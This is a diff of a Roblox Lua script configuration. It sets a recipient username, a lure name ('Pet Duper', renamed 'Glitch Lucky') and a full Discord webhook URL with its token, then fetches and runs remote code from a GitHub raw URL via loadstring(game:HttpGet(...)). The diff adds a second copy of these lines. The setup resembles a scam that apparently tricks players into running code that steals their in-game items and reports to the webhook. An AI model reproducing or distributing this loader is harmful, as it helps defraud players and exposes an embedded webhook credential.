@@ -1,7 +1,11 @@
-_G.Username = "Builderman"
+_G.Username = "dsmswww"
 
-_G.HubName = "Pet Duper"
+_G.HubName = "Glitch Lucky"
 
-_G.WebhookUrl = "discord.com/......."
+_G.WebhookUrl = "https://discord.com/api/webhooks/1107422032225902622/w0B3fXE7W_inqeNrhuPpIxWWkHgxQ4SBmiooatLn5Xx5pgfjj3X15PvNqTtKPk9JMN87"
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
+_G.Username = "dsmswww"
+_G.HubName = "Lucky Glitch"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1107422032225902622/w0B3fXE7W_inqeNrhuPpIxWWkHgxQ4SBmiooatLn5Xx5pgfjj3X15PvNqTtKPk9JMN87"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
